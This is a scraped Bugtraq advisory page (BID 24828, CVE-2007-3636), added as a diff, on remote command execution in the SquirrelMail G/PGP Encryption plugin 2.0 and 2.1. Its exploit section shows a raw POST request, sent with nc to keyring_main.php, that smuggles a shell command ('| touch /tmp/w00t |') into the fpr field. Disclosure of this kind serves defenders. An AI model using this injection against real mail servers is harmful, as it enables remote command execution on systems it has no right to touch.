@@ -1,0 +1,100 @@
+#SpeeDr00t@Black Falcon<br>#bid24828<p><b><span style="font-size: 18pt;">SquirrelMail G/PGP Encryption Plug-in Multiple Unspecified Remote Command Execution Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/24828/info">info</a><br><a href="http://www.securityfocus.com/bid/24828/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/24828/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/24828/solution">solution</a><br><a href="http://www.securityfocus.com/bid/24828/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				24828
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2007-3636<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 09 2007 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 07 2015 05:37PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Stefan Esser disclosed these issues. The original discoverer is not currently known.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					SquirrelMail G/PGP Encryption Plugin  2.1<br/>
+					
+				
+					SquirrelMail G/PGP Encryption Plugin  2.0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers may use a browser to exploit these issues.<br/><br/>The following POST request data demonstrates one of the issues:<br/><br/>$ nc *** 80<br/>POST /webmail/plugins/gpg/modules/keyring_main.php HTTP/1.1<br/>Host: ***<br/>User-Agent: w00t<br/>Keep-Alive: 300<br/>Connection: keep-alive<br/>Cookie: Authentication Data for SquirrelMail<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 140<br/><br/>id=C5B1611B8E71C***&amp;amp;fpr= | touch /tmp/w00t | &amp;amp;pos=0&amp;amp;sort=email_name&amp;amp;desc=&amp;amp;srch=&amp;amp;ring=all&amp;amp;passphrase=&amp;amp;deletekey=true&amp;amp;deletepair=false&amp;amp;trust=1
+	
+		<ul>
+</ul>
+</div>
